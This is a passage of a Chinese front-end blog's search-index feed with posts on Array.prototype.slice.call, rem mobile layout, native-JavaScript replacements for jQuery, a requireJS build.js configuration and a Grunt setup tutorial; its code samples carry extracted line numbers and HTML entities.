true&#125;a.call('littledu');&emsp;&emsp;可以看出，call了后，就把当前函数推入所传参数的作用域中去了，不知道这样说对不对，但反正this就指向了所传进去的对象就肯定的了。到这里，基本就差不多了，我们可以大胆猜一下slice的内部实现，如下:123456789Array.prototype.slice = function(start,end)&#123;var result = new Array();start = start || 0;end = end || this.length; //this指向调用的对象，当用了call后，能够改变this的指向，也就是指向传进来的对象，这是关键for(var i = start; i &lt; end; i++)&#123;result.push(this[i]);&#125;return result;&#125;大概就是这样吧，理解就行，不深究。最后，附个转成数组的通用函数123456789101112var toArray = function(s)&#123; try&#123; return Array.prototype.slice.call(s); &#125; catch(e)&#123; var arr = []; for(var i = 0,len = s.length; i &lt; len; i++)&#123; //arr.push(s[i]); arr[i] = s[i]; //据说这样比push快 &#125; return arr; &#125;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Array.prototype.slice.call</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端布局rem通用代码]]></title>
    <url>%2F2017%2F07%2F14%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%83%E5%B1%80rem%E9%80%9A%E7%94%A8%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[12345678&lt;script&gt;var pixclPatio = 1 / window.devicePixelRatio;document.write('&lt;meta name="viewport" content="width=device-width,initial-scale='+pixclPatio+',minimum-scale='+pixclPatio+',maximum-scale='+pixclPatio+',user-scalable=no" /&gt;');var html = document.getElementsByTagName('html')[0];var pageWidth = html.getBoundingClientRect().width;html.style.fontSize = pageWidth / 16 + 'px';&lt;/script&gt;规则：1、[固定定位]元素内容中有[input]的话，会导致触发键盘之后导致固定定位错位。2、不管使用背景图还是img，一定要调整对应的size（大小）如果图片大小和容器大小一致，那么可以使用100%如果图片大小和容器带下不一样，那么需针对图片分别设置宽/高、x/y3、碰到文字，一定要测量行高，不然高度会不准确4、标签的特性需要熟记于心运算方法：根目录的fontSize为像素的相对单位rem，本例中，设计稿的宽度为640，那么640/16=40rem]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>rem布局</tag>
        <tag>移动端布局</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运用原生js编写自己的JQuery库（三）]]></title>
    <url>%2F2017%2F04%2F14%2F%E8%BF%90%E7%94%A8%E5%8E%9F%E7%94%9Fjs%E7%BC%96%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84jquery%E5%BA%93%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在[运用原生js编写自己的JQuery库（一）]和[运用原生js编写自己的JQuery库（二）]两篇文章中已经列举了大量的使用原生JavaScript替代JQuery的例子，在本文中将继续列举！1、表单获取焦点123456789101112131415161718192021$('#test').focus(); $('#test').focus(function()&#123;&#125;);var t = document.getElementById('test');function addEvent(dom, type, handle, capture) &#123; if(dom.addEventListener) &#123; dom.addEventListener(type, handle, capture); &#125; else if(dom.attachEvent) &#123; dom.attachEvent("on" + type, handle); &#125; &#125;; function focus(elem, fn) &#123; if(fn &amp;amp;&amp;amp; typeof fn === 'function') &#123; addEvent(elem, 'focus', fn); &#125; else &#123; elem.focus(); &#125;&#125;focus(t, function()&#123;&#125;);失去焦点12345678910111213$('#test').blur();$('#test').blur(function()&#123;&#125;);function blur(elem, fn) &#123; if(fn &amp;amp;&amp;amp; typeof fn === 'function') &#123; addEvent(elem, 'blur', fn); &#125; else &#123; elem.blur(); &#125; &#125; blur(t, function()&#123;&#125;);实时监控123456789$('#test').on('input propertychange', fn);function inputChange(dom, fn, capture) &#123; capture = capture || false; addEvent(dom, 'input', fn, capture); addEvent(dom, 'propertychange', fn, capture); &#125;inputChange(t, function()&#123;&#125;);2、判断类型判断类型123$.type(obj);Object.prototype.toString.call(obj).replace(/^\[object (.+)\]$/, '$1').toLowerCase();判断是否为一个函数12345$.isFunction(fn)function isFunction(fn)&#123; return typeof fn === 'function';&#125;判断是否为数字1234567$.isNumeric(num);function isNumber(num) &#123; var type = typeof num; return ( type === 'number' || type === 'string') &amp;amp;&amp;amp; !isNaN( num - parseFloat( num ) );&#125;;判断是否为数组123456789$.isArray(obj);function isArray(obj) &#123; if( Array.isArray ) &#123; return Array.isArray(obj); &#125; else &#123; return Object.prototype.toString.call(obj) === '[object Array]'; &#125;&#125;3、时间获取当前时间123456$.now()new Date().getTime();/* 更简单 */+new Date();4、改变上下文（this）123$.proxy(fn, context);fn.bind(context);5、空函数创建一个空函数123var fn = $.noop();var fn = function() &#123;&#125;6、数组合并数组12345$.merge(arr1, arr2)function (arr1, arr2) &#123; return arr1.concat(arr2);&#125;类数组对象转换成数组12345678var divs = document.querySelectorAll('div');var arr = $.makeArray(divs);var arr = Array.prototype.slice.call(divs);// ES6 var arr = Array.from(divs)7、Iframe获取iframe的document12345$('#iframe').contents();var iframe = document.getElementById('iframe');iframe.contentDocument;8、元素包含关系123456789101112131415161718$.contains(parent, child);function contains(root, el) &#123; /* Chrome / Firefox */ if (root.compareDocumentPosition) &#123; return root === el || !!(root.compareDocumentPosition(el) &amp;amp; 16); &#125; /* IE */ if (root.contains &amp;amp;&amp;amp; el.nodeType === 1)&#123; return root.contains(el) &amp;amp;&amp;amp; root !== el; &#125; while ((el = el.parentNode)) &#123; if (el === root) &#123; return true; &#125; return false; &#125;&#125;9、scroll设置/获取window滚动位置123456789/*获取*/$(window).scrollTop();(document.documentElement &amp;amp;&amp;amp; document.documentElement.scrollTop) || document.body.scrollTop/*设置*/$(window).scrollTop(10);(document.documentElement &amp;amp;&amp;amp; document.documentElement.scrollTop = 10) || document.body.scrollTop = 10;设置某个元素滚动位置12345$('#test').scrollTop(10);var t = document.getElementById('test');t.scrollTop = 10;注意：别加单位！10、节点获取元素的最近的祖先定位（position非static）元素12345$('#test').offsetParent();var t = document.getElementById('test');t.offsetParent;到这里，《运用原生js编写自己的JQuery库》系列就告一段落了！]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JQuery库</tag>
        <tag>编写自己的JQuery库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运用原生js编写自己的JQuery库（二）]]></title>
    <url>%2F2017%2F04%2F13%2F%E8%BF%90%E7%94%A8%E5%8E%9F%E7%94%9Fjs%E7%BC%96%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84jquery%E5%BA%93%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;为什么说不要过度依赖JQuery呢？从项目方面来讲，一些项目在开发中实际用到JQuery内置功能不多，这样会造成项目臃肿；另一方面，目前的主流已经倾向于原生开发。而在上一篇《[运用原生js编写自己的JQuery库（一）]》一文中已经介绍了部分使用原生JavaScript实现JQuery功能的代码，这一章将继续列举。1、位置获取相对于文档的位置1234567891011$('#test').offset() function offset(elem) &#123; var rect = elem.getBoundingClientRect() return &#123; top: rect.top + document.body.scrollTop, left: rect.left + document.body.scrollLeft &#125;&#125;offset(document.getElementById('test'));获取相对于具有定位（非static）的父元素（祖先元素）的位置：12345$('#test').position()var t = document.getElementById('test');var position = &#123;top: t.offsetTop, left: t.offsetLeft&#125;;获取相对于可视区左上角的位置123456var offset = $('#test').offset();var position = &#123; top: offset.top - document.body.scrollTop, left: offset.left - document.body.scrollLeft&#125;var position = document.getElementById('test').getBoundingClientRect();2、尺寸获取包含内边距（padding）和边框（border）的元素高宽123456789var width = $('#test').outerWidth();var height = $('#test').outerHeight();var t = document.getElementById('test');var width = t.offsetWidth;var height = t.offsetHeight;获取元素内容的总高度t = document.getElementById('test');```123456视口大小```javascriptvar pageWidth = window.innerWidth || document.documentElement.clientWidth;var pageHeight = window.innerHeight || document.documentElement.clientHeight;3、绑定自定义数据12345678910111213141516171819202122232425/*绑定*/$('#test').data('name', 'TG');/*读取*/$('#test').data('name');/*移除*/$('#test').removeDate('name');var t = document.getElementById('test');/*绑定*/t.dataset.name = 'TG';/*读取*/t.dataset.name/*移除*/delete t.dataset.name4、事件绑定事件12345678910111213$('#test').on('click', function()&#123;&#125;)var addEvent = function(dom, type, handle, capture) &#123; if(dom.addEventListener) &#123; dom.addEventListener(type, handle, capture); &#125; else if(dom.attachEvent) &#123; dom.attachEvent("on" + type, handle); &#125;&#125;;var t = document.getElementById('test');addEvent(t, 'click', function()&#123;&#125;);移除事件12345678910111213$('#test').off('click', fn);var deleteEvent = function(dom, type, handle) &#123; if(dom.removeEventListener) &#123; dom.removeEventListener(type, handle); &#125; else if(dom.detachEvent) &#123; dom.detachEvent('on' + type, handle); &#125;&#125;;var t = document.getElementById('test');deleteEvent(t, 'click', fn);事件代理123456789101112131415161718$(document).on('click', '.test', fn);function eventBroker(e, className, fn) &#123; var target = e.target; while(target) &#123; if(target &amp;amp;&amp;amp; target.nodeName == '#document') &#123; break; &#125; else if(target.classList.contains(className)) &#123; fn(); break; &#125;; target = target.parentNode; &#125;; &#125;addEvent(document, 'click', function(e)&#123; eventBroker(e, 'test', function()&#123;&#125;);&#125;);获取Event对象12345678$('#test', 'click', function(event)&#123; event = event.originalEvent;&#125;);var t = document.getElementById('test');addEvent(t, 'click', function(event)&#123; event = event || window.event;&#125;);DOM加载完毕123456789101112131415$(document).ready(function()&#123;&#125;);function ready(fn) &#123; if (document.readyState != 'loading')&#123; // ie9+ document.addEventListener('DOMContentLoaded', fn); &#125; else &#123; // ie8 document.attachEvent('onreadystatechange', function() &#123; if (document.readyState != 'loading')&#123; fn(); &#125; &#125;); &#125; &#125;指定事件触发123456789101112131415$('#test').trigger('click');function trigger(elem, type) &#123; if (document.createEvent) &#123; var event = document.createEvent('HTMLEvents'); event.initEvent(type, true, false); elem.dispatchEvent(event); &#125; else &#123; elem.fireEvent('on' + type); &#125;&#125;var t = document.getElementById('test');trigger(t, 'click');5、AJAXGET12345678910111213141516171819$.get("test.php", &#123; name: "TG"&#125;, function(data)&#123; console.log(data); &#125;);var xhr= new XMLHttpRequest(); xhr.open('GET', 'test.php?name=TG', true); // false（同步） xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4) &#123; if (xhr.status &gt;= 200 &amp;amp;&amp;amp; xhr.status &lt; 400) &#123; // 成功 var data = JSON.parse(xhr.responseText); &#125; else &#123; // 错误 &#125; &#125; &#125;;xhr.send(null);POST123456789101112131415161718192021$.post("test.php", &#123; name: "TG"&#125;, function(data)&#123; console.log(data); &#125;);var xhr= new XMLHttpRequest(); xhr.open('POST', 'test.php', true); // false（同步） xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); // 必需xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4) &#123; if (xhr.status &gt;= 200 &amp;amp;&amp;amp; xhr.status &lt; 400) &#123; // 成功 var data = JSON.parse(xhr.responseText); &#125; else &#123; // 错误 &#125; &#125; &#125;;var data = &#123;name: "t"&#125;; xhr.send(data);Fetch 请求GET1234567fetch(url).then(function (response) &#123; return response.json(); &#125;).then(function (jsonData) &#123; console.log(jsonData); &#125;).catch(function () &#123; console.log('出错了'); &#125;);POST1234567fetch(url,&#123; method: 'POST', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125;, body: 'name=TG&amp;amp;love=1'&#125;).then(function(response)&#123;&#125;)6、数组判断元素是否在数组内array)```123判断是否是数组```Array.isArray(arr)数组迭代12$.map(arr, function(value, index) &#123;&#125;)arr.map(function(value, index) &#123;&#125;)7、特效隐藏显示123456789$('#test').hide();var t = document.getElementById('test');t.style.display = 'none';$('#test').show();t.style.display = 'block';]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JQuery库</tag>
        <tag>编写自己的JQuery库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运用原生js编写自己的JQuery库（一）]]></title>
    <url>%2F2017%2F04%2F13%2F%E8%BF%90%E7%94%A8%E5%8E%9F%E7%94%9Fjs%E7%BC%96%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84jquery%E5%BA%93%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;毫无疑问，JQuery是一款非常优秀的JavaScript库，它让我们开发项目变得更加便捷容易。不过，当你准备在一个项目（特别是移动项目）中使用JQuery时，你真的该好好思考一下，你会用到JQuery的哪些功能，是否真的需要jQuery。因为随着JavaScript的不断改善进化，现在它内置的功能已经非常强大，在很大程度上，已经可以实现以前需要在JQuery中才能实现的技术（如果你的项目需要在IE8之前的浏览器中使用，建议还是使用JQuery，这样可以省却很多兼容性问题）。下面将列出一些可以使用JavaScript来实现JQuery功能的代码：1、查找搜索选择器按ID查找：=> document.getElementById('test');```1234按class类名查找：```$(&apos;.test&apos;) =&gt; document.getElementsByClassName(&apos;test&apos;)按标签名查找：=> document.getElementsByTagName('div')```12345678当然，你也可以统一查找：```javascript$(&apos;#test&apos;)document.querySelector(&apos;#test&apos;)$(&apos;#test div&apos;) =&gt; document.querySelectorAll(&apos;#test div&apos;)$(&apos;#test&apos;).find(&apos;span&apos;) =&gt; document.querySelectorAll(&apos;#test span&apos;);获取单个元素：div').eq(0)[0] => document.querySelectorAll('#test div')[0]```12345678获取HTML、head、body：```javascript$(&apos;html&apos;) =&gt; document.documentElement$(&apos;head&apos;) =&gt; document.head$(&apos;body&apos;) =&gt; document.body判断节点是否存在123$('#test').length &gt; 0 =&gt; document.getElementById('test') !== null$('div').length &gt; 0 =&gt; document.querySelectorAll('div').length &gt; 0遍历节点：123456789101112131415$('div').each(function(i, elem) &#123;&#125;)function forEach(elems, callback) &#123; if([].forEach) &#123; [].forEach.call(elems, callback); &#125; else &#123; for(var i = 0; i &lt; elems.length; i++) &#123; callback(elems[i], i); &#125; &#125;&#125;var div = document.querySelectorAll('div');forEach(div, function(elem, i)&#123;&#125;);清空节点=> document.getElementById('test').innerHTML = '';```12345节点比较```javascript$(&apos;div&apos;).is($(&apos;#test&apos;)) =&gt; document.querySelector(&apos;div&apos;) === document.getElementById(&apos;test&apos;)2、获取/设置内容（值）获取/设置元素内的内容123456789$('div').html() =&gt; document.querySelecotr('div').innerHTML$('div').text() =&gt; var t = document.querySelector('div');t.textContent || t.innerText;$('div').html('&lt;span&gt;abc&lt;/span&gt;'); =&gt; document.querySelecotr('div').innerHTML = '&lt;span&gt;abc&lt;/span&gt;';$('div;).text('abc') =&gt; document.querySelecotr('div').textContent = 'abc'获取包含元素本身的内容1$('&lt;div&gt;').append($('#test').clone()).html() =&gt; document.getElementById('test').outerHTML $('&lt;div&gt;').append($('#test').clone()).html('&lt;span&gt;abc&lt;/span&gt;') =&gt; document.getElementById('test').outerHTML = '&lt;span&gt;abc&lt;/span&gt;'获取表单值123$('input').val() =&gt; document.querySelector('input').value$('input').val('abc') =&gt; document.querySelector('input').value = 'abc'3、class类名操作类名新增123456789101112$('#test').addClass('a')function addClass(elem, className) &#123; if(elem.classList) &#123; elem.classList.add(className); &#125; else &#123; elem.className += ' ' + className; &#125;&#125;addClass(document.getElementById('test'), 'a');类名删除1234567891011$('#test').removeClass('a');function removeClass(elem, className) &#123; if(elem.classList) &#123; elem.classList.remove(className); &#125; else &#123; elem.className = elem.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'), ' '); &#125;&#125;removeClass(document.getElementById('test'), 'a');类名包含：1234567891011$('#test').hasClass('a')function hasClass(elem, className) &#123; if(elem.classList) &#123; return elem.classList.contains(className); &#125; else &#123; return new RegExp('(^| )' + className + '( |$)', 'gi').test(elem.className); &#125;&#125;hasClass(document.getElementById('test'), 'a');4、节点操作创建节点1$('&lt;div&gt;') =&gt; document.createElement('div')复制节点：1$('div').clone() =&gt; document.querySelector('div').cloneNode(true)插入节点:12345$('div').append('&lt;span&gt;&lt;/span&gt;')var span = document.createElement('span');document.querySelector('div').appendChild(span);在指定节点之前插入新的子节点12345678$('&lt;span&gt;').insertBefore('#test');var t = document.getElementById('test');var span = document.createElement('span');t.parentNode.insertBefore(span, t);/*更简单的*/t.insertAdjacentHTML('beforeBegin', '&lt;span&gt;&lt;/span&gt;');在指定节点后插入新的子节点：1234567891011121314151617$('&lt;span&gt;').insertAfter('#test')function insertAfter(elem, newNode)&#123; if(elem.nextElementSibling) &#123; elem.parentNode.insertBefore(newNode, elem.nextElementSibling); &#125; else &#123; elem.parentNode.appendChild(newNode); &#125;&#125;var t = document.getElementById('test'); var span = document.createElement('span'); insertAfter(t, span);/*更简单的*/t.insertAdjacentHTML('afterEnd', '&lt;span&gt;&lt;/span&gt;');获取父节点1$('#test').parent() =&gt; document.getElementById('test').parentNode删除节点12345$('#test').remove() var t = document.getElementById('test');t.parentNode.removeChild(t);获取Element子节点123456789101112131415$('#test').children()function children(elem) &#123; if(elem.children) &#123; return elem.children; &#125; else &#123; var children = []; for (var i = el.children.length; i--;) &#123; if (el.children[i].nodeType != 8) children.unshift(el.children[i]); &#125; return children; &#125;&#125;children(document.getElementById('test'));获取下一个兄弟节点：12345678910111213$('#test').next()function nextElementSibling(elem) &#123; if(elem.nextElementSibling) &#123; return elem.nextElementSibling; &#125; else &#123; do &#123; elem = elem.nextSibling; &#125; while ( elem &amp;amp;&amp;amp; elem.nodeType !== 1 ); return elem; &#125;&#125;nextElementSibling(document.getElementById('test'));获取上一个兄弟节点：12345678910111213$('#test').prev() function previousElementSibling(elem) &#123; if(elem.previousElementSibling) &#123; return elem.previousElementSibling; &#125; else &#123; do &#123; elem = elem.previousSibling; &#125; while ( elem &amp;amp;&amp;amp; elem.nodeType !== 1 ); return elem; &#125; &#125; previousElementSibling(document.getElementById('test'));5、属性操作获取属性1$('#test').attr('class') =&gt; document.getElementById('test').getAttribute('class')删除属性1$('#test').removeAttr('class') =&gt; document.getElementById('test').removeAttribute('class')设置属性1$('#test').attr('class', 'abc') =&gt; document.getElementById('test').setAttribute('class', 'abc');6、CSS样式操作设置样式1$('#test').css('height', '10px'); =&gt; document.getElementById('test').style.height = '10px';获取样式123获取伪类的CSS样式```window.getComputedStyle(el , &quot;:after&quot;)[attrName];注：IE是不支持获取伪类的7、字符串操作去除空格1234567891011$.trim(' abc ') function trim(str)&#123; if(str.trim) &#123; return str.trim(); &#125; else &#123; return str.replace(/^\s+|\s+$/g, ''); &#125;&#125;trim(' abc ');8、JSON操作JSON序列化1$.stringify(&#123;name: "TG"&#125;) =&gt; JSON.stringify(&#123;name: "TG"&#125;)JSON反序列化1$.parseJSON('&#123; "name": "TG" &#125;') =&gt; JSON.parse('&#123; "name": "TG" &#125;')]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JQuery库</tag>
        <tag>编写自己的JQuery库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[requireJS模块加载器优化工具，bulid.js详解]]></title>
    <url>%2F2017%2F04%2F11%2Frequirejs%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%BC%98%E5%8C%96%E5%B7%A5%E5%85%B7%EF%BC%8Cbulid-js%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[requireJS是javascript的模块加载器，是基于AMD规范实现的。r.js是其提供的对模块进行打包和构建的一个工具下载 r.js创建r.js 的配置文件 build.jsbuild.js1234567891011121314151617181920212223242526272829(&#123; appDir: './', //项目根目录 out: 'main-build.js', //输出文件名 dir: './outdir', //输出目录，全部文件打包后要放入的文件夹（如果没有会自动新建的） /* 有了dir，就不能使用out配置项了，你在编译时它有非常明确的提示 */ baseUrl: './js/pages', //相对于appDir，代表要查找js文件的起始文件夹，下文所有文件路径的定义都是基于这个baseUrl的 modules: [ //要优化的模块 —— 里面的配置项即各页面的 相对baseUrl路径的 省略后缀“.js”的 入口文件(入口文件 ---- 即加载页面时引入require.js的script标签上data-main属性所指定的文件) //该属性必不可少，因为一个程序至少需要有一个入口 &#123; name:'main'&#125;, &#123; name:'index'&#125; ], fileExclusionRegExp: /^(r|build)\.js|.*\.scss$/, //正则匹配过滤文件，匹配到的文件将不会被输出到输出目录去，这里过滤掉的是 r.js、build.js、*.scss三类文件 optimizeCss: 'standard', removeCombined: true, //如果为true，优化器将从输出目录中删除已合并的文件 paths: &#123; //各模块相对baseUrl的路径，直接从require.config的path配置中烤取即可 "underscore": "../libs/underscore/underscore-min", "backbone": "../libs/backbone/backbone-min", &#125;, shim:&#123;// 配置不符合AMD规范的模块，直接从require.config的shim配置中烤取即可 "underscore": &#123; exports: "_" &#125;, "backbone": &#123; deps: ["underscore", "jquery"], exports: "Backbone" &#125;, &#125; &#125;)常用的build.js的参数属性解释：r.js把各页面所需要用到的脚本全部都整合到各自的入口文件(一个或多个js)中去，从而减少了对服务器的请求。mainConfigFile：’common.js’ //多页面复杂工程的多个入库文件的统一的 require.config 的配置放置文件，相对baseUrl的路径由于多页面工程需要多个入库文件，此时就会出现相同的 require config 的在一个工程下配置多次的问题，为了避免这种问题，可以将多个入库文件的相同config提出到一个js文件中，进行统一配置，并且就会用到build.js的mainConfigFile参数来对其进行重新定义模块实例可参考：https://github.com/requirejs/example-multipage-shim一篇通俗易懂的r.js打包应用简例：http://www.tuicool.com/articles/iYNJbqZ]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>bulid.js</tag>
        <tag>requireJS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用grunt搭建自动化的web前端开发环境]]></title>
    <url>%2F2017%2F04%2F11%2F%E7%94%A8grunt%E6%90%AD%E5%BB%BA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[jQuery在使用grunt，bootstrap在使用grunt，百度UEditor在使用grunt，你没有理由不学、不用！1. 前言&emsp;&emsp;各位web前端开发人员，如果你现在还不知道grunt或者听说过、但是不会熟练使用grunt，那你就真的真的真的out了（三个“真的”重复，表示重点）。至于grunt的作用，这里不详细说了，总之你如果做web前端开发，你一定要用grunt。还有一点，它完全免费，没有盗版。既强大又免费的东西，为何不用？&emsp;&emsp;当然了，你如果你能找到更好的替代grunt的其他工具也是可以的，例如gulp。Gulp未来有可能替代grunt，但是现在来说市场占有率还是不如grunt。而这种工具咱们是现在就需要用的，所有不要再犹豫了，拿来主义，先用grunt，即学即用。2. 安装nodejs&emsp;&emsp;Grunt和所有grunt插件都是基于nodejs来运行的，如果你的电脑上没有nodejs，就去安装吧。安装nodejs非常简单，完全傻瓜式、下一步下一步下一步、的安装方式，这里不再赘述。去 https://nodejs.org/ 上，点击页面中那个绿色、大大的“install”按钮即可。&emsp;&emsp;安装了nodejs之后，可以在你的控制台中输入“node -v”来查看nodejs的版本，也顺便试验nodejs是否安装成功。注意两点。第一，grunt依赖于nodejs的v0.8.0及以上版本；第二，奇数版本号的版本被认为是不稳定的开发版，不过从官网上下载下来的应该都是偶数的稳定版。3. 安装grunt-CLI注意，如果你的电脑不联网，以下操作你都做不了，所以，首先保证电脑联网。&emsp;&emsp;“CLI”被翻译为“命令行”。要想使用grunt，首先必须将grunt-cli安装到全局环境中，使用nodejs的“npm install…”进行安装。如果你不了解nodejs的npm如何安装软件，这里就先不要问了，先照着我说的做。打开控制台（注意：windows系统下请使用管理员权限打开），输入：&emsp;&emsp;注意，mac os 系统、部分linux系统中，在这句话的前面加上“sudo ”指令。回车，命令行会出现一个转动的小横线，表示正在联网加载。加载的时间看你网速的快慢，不过这个软件比较小，一般加载时间不会很长，稍一会儿，就加载完了。你会看到以下界面。这时候要验证一下grunt-cli是否安装完成并生效，你只需要继续在命令行中输入“grunt”命令即可。如果生效，则会出现以下结果：你不要管这些结果是什么意思，总之出现这些提示，证明你的grunt-cli安装成功了。4. 创建一个简单的网站&emsp;&emsp;Grunt是应用于实际项目的，所以我们得有一个简单的测试网站来演示grunt的安装、使用。&emsp;&emsp;首先，我在电脑的D盘下面建了一个“grunt_test”文件夹，里面建了三个空文件夹、两个空文档，名称如下图。（注意 Gruntfile.js 文件的首字母大写！）&emsp;&emsp;其他的东西先不要管，先把package.json这个文件写一些东西。记住，既然文件后缀名叫“json”，那么文件中的格式肯定是严格的json格式。什么，不熟悉json？作为一个web前端程序猿，json是必备课。有一个教程《json2.js源码解读》能让你彻底了解json。书归正传。Package.json的内容我们写成如下格式：&emsp;&emsp;很简单，我们把这个网站或系统的名称、版本写了一下。但是，不光是写在这里占空的，以后会用到的，具体如何用，我们下文会有介绍，先别着急。&emsp;&emsp;还有，最后一个“devDependencies”是什么意思？字面意思解释是“开发依赖项”，即我们现在这个系统，将会依赖于哪些工具来开发。现在代码一行都没有写，依赖于谁？谁也不依赖！所以，就先写一个空对象。但是下文会慢慢把它填充起来。&emsp;&emsp;另外，其实package.json中你可以增加任何符合json格式的代码，它生来自由，仅仅受json代码格式的限制。&emsp;&emsp;怎么样，看到这里，是不是觉得下文很有悬念，很想看下去呀？那就继续！5. 安装grunt&emsp;&emsp;接下来我们会有一系列插件的安装，他们的安装过程和grunt一样。但是他们的执行都是基于grunt的，因此才能把grunt叫做一个“构建工具”。Grunt没有具体的作用，但是它能把有具体作用的一个一个插件组合起来，形成一个整体效应。&emsp;&emsp;例如，你需要检查js语法错误，然后再去压缩js代码。如果这两步你都去手动操作，会耗费很多成本。Grunt就能让你省去这些手动操作的成本。&emsp;&emsp;书归正传。注意，这里安装grunt不再是全局安装了，需要你在控制台进入到网站或系统的具体目录下。这里我们进入 D:\grunt_test 目录下。然后输入以下命令。&emsp;&emsp;注意，先不要按回车，先不要执行，先看看下文的描述！&emsp;&emsp;这里需要解释的是，“—save-dev”的意思是，在当前目录安装grunt的同时，顺便把grunt保存为这个目录的开发依赖项。看到“开发依赖项”这一次，是不是觉得有些眼熟？上文在配置package.json时，其中的“devDependencies”中就会存储开发依赖项。&emsp;&emsp;具体保存为开发依赖项是一个什么效果？动手安装一下就是了。首先，在运行安装grunt的命令之前，package.json中的“devDependencies”对应的是空对象。&emsp;&emsp;现在我们来运行这行命令。你会看到几条warning提示，不用管它。然后接下来就是加载状态，一个旋转的小横线。稍等待一会儿，会提示你安装成功。如下图：&emsp;&emsp;现在你应该第一时间打开package.json去看看，那里的“devDependencies”有什么变化。我这里的变化如下图，看看你的是不是和我的一样？&emsp;&emsp;然后你再看看文档目录中的文件或者文件夹有什么变化？我这里多了一个“node_modules”文件夹，其中有一个“grunt”文件夹，再其中有若干文档。这里就是存储grunt源文件的地方。&emsp;&emsp;这是见证奇迹的时刻，别着急，奇迹还没完呢。然后你在控制台运行“grunt”命令。如果你得到一个warning提示，那说明grunt已经起作用了。如下图：&emsp;&emsp;经过以上三步，说明grunt已经在这个目录下成功安装。&emsp;&emsp;那么，为何我们在刚才执行grunt时候会有Warning提示呢？根据提示，我们得知的信息是：Task “default” not found ，如何搞定这个问题？——当然是继续往下看啊。6. 配置Gruntfile.js&emsp;&emsp;顾名思义，Gruntfile.js 这个文件，肯定是为了grunt做某种配置的。按照grunt的规定，我们首先把Gruntfile.js配置成如下格式。&emsp;&emsp;在以上代码中，我们看到了刚才运行grunt命令，warning提示中的“default”字眼。不妨我们此时再运行一下grunt命令，看看会不会再次出现“warning”、“default”等字眼。&emsp;&emsp;运行结果告诉我们“Done, without errors”。那就继续往下吧。&emsp;&emsp;另外请注意Gruntfile.js中的一句话：&emsp;&emsp;这句话是在Gruntfile.js中获取package.json中的内容。在上文配置package.json时我们说过：package.json中的内容不光是用来占位置的，还可以在其他地方获取。这里不是已经获取了package.json内容了吗？至于获取了如何使用，下文会有介绍，还是继续往下看吧。7. Grunt插件介绍&emsp;&emsp;进入grunt官网的插件列表页面 http://www.gruntjs.net/plugins ，我们能看到grunt到目前位置的所有插件。现在里面有4560个插件，这个数量每天都在增加。而且，这些既然出现在官网，肯定是经过审核的。&emsp;&emsp;插件分为两类。第一类是grunt团队贡献的插件，这些插件的名字前面都带有“contrib-”前缀，而且在插件列表中有星号标注。第二类是第三方提供的插件，不带有这两个特征。&emsp;&emsp;和jquery一样，插件那么多，肯定不会全部用。grunt官网插件列表的前几个插件中的前几个插件，下载量最多，它们肯定是大家都在用的插件。第一名jshint插件最近30天下载量将近89万次，这是多么惊人的下载量！&emsp;&emsp;咱们可以把前几名插件的作用简单描述一下，看看你在实际编码过程中是否需要？其实不用看就知道答案——肯定需要——要不然怎么会下载量那么高呢？•Contrib-jshint——javascript语法错误检查；•Contrib-watch——实时监控文件变化、调用相应的任务重新执行；•Contrib-clean——清空文件、文件夹；•Contrib-uglify——压缩javascript代码•Contrib-copy——复制文件、文件夹•Contrib-concat——合并多个文件的代码到一个文件中•karma——前端自动化测试工具&emsp;&emsp;以上这些插件，本文不会全部讲到。但是随着讲解其中的一部分，我想你就能掌握使用grunt插件的方法。知道方法了，然后你就可以参考官方文档去使用你想要的插件。&emsp;&emsp;grunt集全世界web前端开发的智慧于一身，比你想想的更加强大，它的插件库能应对你在web前端开发遇到的任何事情。&emsp;&emsp;还等什么，继续往下看。8. 使用uglify插件（压缩javascript代码）&emsp;&emsp;Uglify插件的功能就是压缩javascript代码。至于javascript代码压缩的必要和意义，这里就不用在赘述了吧？几乎每一个javascript类库或者框架，都有一个 **.min.js 